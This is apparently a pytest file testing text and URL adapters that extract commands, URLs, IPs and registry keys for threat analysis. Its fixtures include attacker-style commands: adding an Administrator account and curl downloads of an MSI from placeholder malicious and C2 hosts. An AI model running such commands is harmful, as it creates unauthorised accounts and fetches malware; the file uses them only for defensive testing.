"""Phase 3A adapter contract tests — Text + URL.

Every adapter must:
  1. Emit an IEP that passes the Phase 2.5 contract suite.
  2. Populate provenance (adapter name + version).
  3. Attach source_ref to every artifact (R6).
  4. Only produce artifacts of canonical IEP types.
"""
from __future__ import annotations

import pytest

from models.iep import IEP, IEP_SCHEMA_VERSION
from services.adapters import TextAdapter, URLAdapter, adapt


# ─── Text adapter ──────────────────────────────────────────────────────
def test_text_adapter_can_handle_plain_string():
    a = TextAdapter()
    assert a.can_handle("whoami\nnet user\n")
    assert not a.can_handle("https://example.com")  # URL adapter's job
    assert not a.can_handle(b"\x00\x01\x02")        # non-str


def test_text_adapter_produces_valid_iep_from_command_paste():
    paste = (
        "whoami\n"
        "net user Administrator /add\n"
        "curl.exe -o C:\\ProgramData\\a.msi https://mal.example/a.msi\n"
    )
    iep = TextAdapter().make_iep(paste)
    assert isinstance(iep, IEP)
    assert iep.schema_version == IEP_SCHEMA_VERSION
    assert iep.provenance.adapter == "adapter.text"
    assert iep.provenance.adapter_version == "1.0"
    # ≥ 1 command + ≥ 1 URL
    assert iep.statistics.commands >= 1
    assert iep.statistics.urls     >= 1


def test_text_adapter_every_artifact_has_source_ref():
    iep = TextAdapter().make_iep(
        "line-1\nwhoami\nhttps://x.example/y\n10.0.0.1\n"
    )
    for a in iep.artifacts:
        assert a.source_ref, f"{a.type}={a.value} has no source_ref"


def test_text_adapter_json_roundtrip():
    iep = TextAdapter().make_iep("whoami")
    raw = iep.model_dump_json()
    back = IEP.model_validate_json(raw)
    assert back.id == iep.id
    assert back.provenance.adapter == "adapter.text"


# ─── URL adapter ───────────────────────────────────────────────────────
def test_url_adapter_can_handle_http_and_https():
    a = URLAdapter()
    assert a.can_handle("https://x.example/y")
    assert a.can_handle("  http://x.example  ")
    assert not a.can_handle("whoami")
    assert not a.can_handle(b"https://x")


def test_url_adapter_uses_playwright_fallback_flag(monkeypatch):
    """When the acquisition cascade falls back to Playwright, the
    adapter surfaces an info-level warning so the analyst sees it."""
    from services.adapters import url_adapter as ua_mod

    def fake_acquire(url, **kw):
        return {
            "text":              "Curl download: curl.exe -o x.msi https://c2/x",
            "structured_blocks": ["curl.exe -o x.msi https://c2/x"],
            "sitename":          "example",
            "title":             "T",
            "vendor":            "Example",
            "final_url":         url,
            "status_code":       200,
            "strategy":          "playwright_fallback",
        }

    monkeypatch.setattr("services.ida.acquisition.acquire_url",
                        fake_acquire, raising=False)
    iep = URLAdapter().make_iep("https://x.example/y")

    assert iep.provenance.adapter == "adapter.url"
    assert iep.source.kind == "url"
    assert iep.metadata.data["acquisition"]["strategy"] == "playwright_fallback"
    codes = {w.code for w in iep.warnings}
    assert "url_playwright_fallback" in codes


# ─── Router ────────────────────────────────────────────────────────────
def test_registry_prefers_url_over_text():
    iep_url  = adapt("https://x.example/y")
    iep_text = adapt("hello world")
    assert iep_url.provenance.adapter  == "adapter.url"
    assert iep_text.provenance.adapter == "adapter.text"


def test_registry_falls_through_to_text():
    iep = adapt(12345)          # non-string, non-URL
    assert iep.provenance.adapter == "adapter.text"


# ─── R5 — engines can consume artifacts without touching content ───────
def test_downstream_engine_reads_artifacts_only():
    iep = TextAdapter().make_iep(
        "whoami\n"
        "https://foo.example/bar\n"
        "10.0.0.1\n"
        "HKLM\\SOFTWARE\\Run\n"
    )
    # A hypothetical engine that only reads artifacts:
    assert iep.by_type("command")
    assert iep.by_type("url")
    assert iep.by_type("ip")
    assert iep.by_type("registry_key")
    # Values include canonicalised registry
    regs = iep.values_of("registry_key")
    assert any(r.startswith("HKEY_LOCAL_MACHINE\\") for r in regs)
